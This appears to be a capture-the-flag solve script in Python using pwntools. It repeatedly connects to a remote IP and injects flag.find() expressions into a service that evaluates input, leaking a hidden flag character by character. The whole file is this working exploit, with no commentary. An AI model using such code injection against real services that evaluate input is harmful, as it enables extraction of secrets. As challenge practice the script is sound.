import string
from pwn import *

context.log_level = "CRITICAL"

flag = [0 for i in range(921)]

for a in string.printable:
    start = 0
    sick = True
    # print("INDEXING", a)
    while sick:
        c = remote('108.137.70.166', 14000)
        s = f'flag.find("{a}",{start})'
        c.sendline(s.encode('utf-8'))
        idx = int(c.recvall()[3:-1])
        # print(f'{a} {idx}')
        if idx != -1:
            flag[idx] = a
            print(f'flag[{idx}]="{a}"',end=';')
            start = idx + 1
        else:
            sick = False
        c.close()

for c in flag:
    print(ord(c), end='')

